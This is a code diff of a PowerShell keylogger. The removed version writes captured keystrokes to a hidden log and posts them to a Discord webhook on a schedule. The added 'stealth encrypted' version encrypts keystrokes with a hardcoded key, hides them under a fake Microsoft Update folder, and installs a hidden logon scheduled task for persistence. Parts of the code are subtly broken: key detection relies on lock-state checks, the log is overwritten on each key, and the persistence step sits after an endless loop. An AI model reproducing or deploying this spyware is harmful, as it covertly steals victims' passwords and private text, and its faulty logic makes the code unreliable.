@@ -1,51 +1,40 @@
-<#
-.SYNOPSIS
-  PowerShell Keylogger with log schedule and killswitch
-#>
+# Keylogger v1.1 (Stealth Encrypted Version)
 
-$dc = $env:DC_WEBHOOK
-$log = $env:LOG_TIME
-$ks  = $env:KILLSWITCH
-$fn  = "$env:APPDATA\kl_" + [System.Guid]::NewGuid().ToString() + ".log"
+# AES Encryption Setup
+$k = [System.Text.Encoding]::UTF8.GetBytes('MyS3cr3tK3y12345')
+$iv = New-Object Byte[] 16
+(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv)
 
+# Generate random log file path
+$f = "$env:APPDATA\Microsoft\Update\{0}" -f ([guid]::NewGuid())
+$d = "$env:APPDATA\Microsoft\Update\"
+mkdir $d -ea 0 | Out-Null
+
+# Create AES encryptor
+$a = [System.Security.Cryptography.Aes]::Create()
+$a.Key = $k
+$a.IV = $iv
+$e = $a.CreateEncryptor()
+
+# Load key detection assembly
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$null = [System.Windows.Forms.Application]::EnableVisualStyles()
+$h = @()
 
-function sK {
-    $x = ""
-    $lh = [System.Windows.Forms.Keys]
-    while ($true) {
-        Start-Sleep -Milliseconds 10
-        foreach ($k in [Enum]::GetValues($lh)) {
-            if ([System.Windows.Forms.Control]::IsKeyLocked($k) -or [System.Windows.Forms.Control]::ModifierKeys) {
-                if ([System.Windows.Forms.InputSimulator]::IsKeyDown($k)) {
-                    $x += "$k " | Out-File -Append $fn
-                }
-            }
+# Keylogging loop
+while ($true) {
+    Start-Sleep -Milliseconds 300
+    foreach ($c in 1..254) {
+        if ([System.Windows.Forms.Control]::IsKeyLocked($c)) {
+            $b = [System.Text.Encoding]::UTF8.GetBytes([char]$c)
+            $x = $e.TransformFinalBlock($b, 0, $b.Length)
+            [System.IO.File]::WriteAllBytes($f, $iv + $x)
         }
     }
 }
 
-Start-Job -ScriptBlock { sK }
+# Scheduled task setup
+$taskName = "Microsoft-UpdateAgent"
+$taskPath = "$env:APPDATA\Microsoft\Update\update.ps1"
+Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskPath -Force
 
-function sL {
-    while ($true) {
-        $now = Get-Date -Format "hh:mm tt"
-        if ($now -eq $log) {
-            try {
-                $payload = Get-Content $fn -Raw
-                Invoke-RestMethod -Uri $dc -Method POST -Body @{ content = "Keylog: `n$payload" }
-                Remove-Item $fn -Force -ErrorAction SilentlyContinue
-            } catch {}
-        }
-
-        if ($ks -ne "" -and (Get-Date) -ge (Get-Date $ks)) {
-            Remove-Item $fn -Force -ErrorAction SilentlyContinue
-            Stop-Process -Id $PID -Force
-        }
-
-        Start-Sleep -Seconds 60
-    }
-}
-sL
+schtasks /create /tn $taskName /tr "powershell -w h -NoP -NonI -ExecutionPolicy Bypass -File `"$taskPath`"" /sc onlogon /f | Out-Null
